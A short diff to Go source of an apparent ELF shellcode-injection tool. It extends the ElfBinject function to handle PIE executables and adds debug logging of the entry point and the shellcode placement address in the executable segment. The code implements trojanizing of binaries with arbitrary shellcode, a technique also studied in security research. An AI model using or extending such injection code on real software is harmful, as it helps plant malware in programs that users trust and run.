@@ -56,7 +56,8 @@ func ElfBinject(sourceFile string, destFile string, shellcodeFile string, config
 	// END CODE CAVE DETECTION SECTION
 	//
 
-	if elfFile.FileHeader.Type == elf.ET_EXEC {
+	if elfFile.FileHeader.Type == elf.ET_EXEC || // for non-PIE executables
+		elfFile.SectionByName(".interp") != nil { // for PIE executables, todo: libc.so.6 has an .interp section?
 		if config.InjectionMethod == SilvioInject {
 			return staticSilvioMethod(elfFile, destFile, userShellCode)
 		} else {
@@ -247,6 +248,8 @@ func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) err
 			}
 		}
 	}
+	log.Println("init count:", initCnt, "array count:", arrayCnt, "first null index:", nullIdx)
+	log.Printf("original entry point: %X\n", originalEntryPoint)
 
 	// Insert the payload
 	scAddr := uint64(0)
@@ -255,6 +258,7 @@ func dynamicMethod(elfFile *elf.File, destFile string, userShellCode []byte) err
 	for _, p := range elfFile.Progs {
 		if p.Type == elf.PT_LOAD && p.Flags == (elf.PF_R|elf.PF_X) {
 			scAddr = p.Vaddr + p.Filesz
+			log.Printf("shellcode address: %X\n", scAddr)
 			if originalEntryPoint > 0 {
 				shellcode = api.ApplySuffixJmpIntel64(userShellCode, uint32(scAddr), uint32(originalEntryPoint), elfFile.ByteOrder)
 			} else {
